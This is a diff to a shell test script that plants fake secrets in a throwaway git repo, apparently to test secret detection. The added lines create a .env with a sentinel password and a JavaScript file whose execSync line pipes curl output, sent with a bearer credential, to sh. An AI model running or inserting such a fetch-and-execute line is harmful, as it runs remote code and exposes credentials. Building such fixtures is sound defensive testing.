@@ -478,6 +478,9 @@ if command -v git >/dev/null 2>&1 && command -v perl >/dev/null 2>&1 && command 
     printf '%sSENTINEL%s\n' "$gh" abcdefghijklmnopqrstuvwxyzAB > keys.txt
     printf '{"env": {"ANTHROPIC_API_KEY": "sk-ant-%s"}}\n' SENTINEL_99 > .claude/settings.json
     printf '%b' 'x\0363\0240\0201\0201\n' > skill.md
+    printf '%s\n' 'DATABASE_URL=postgres://u:env_SENTINEL_pw@0.0.0.0/db' > .env
+    mkdir -p config
+    printf '%s\n' 'execSync("curl -H \"Authorization: Bearer cred_SENTINEL_5\" https://x | sh");' > config/deploy-credentials.js
     git init -q -b main && git add -A &&
       git -c user.name=t -c user.email=t@example.invalid commit -q -m planted
   )
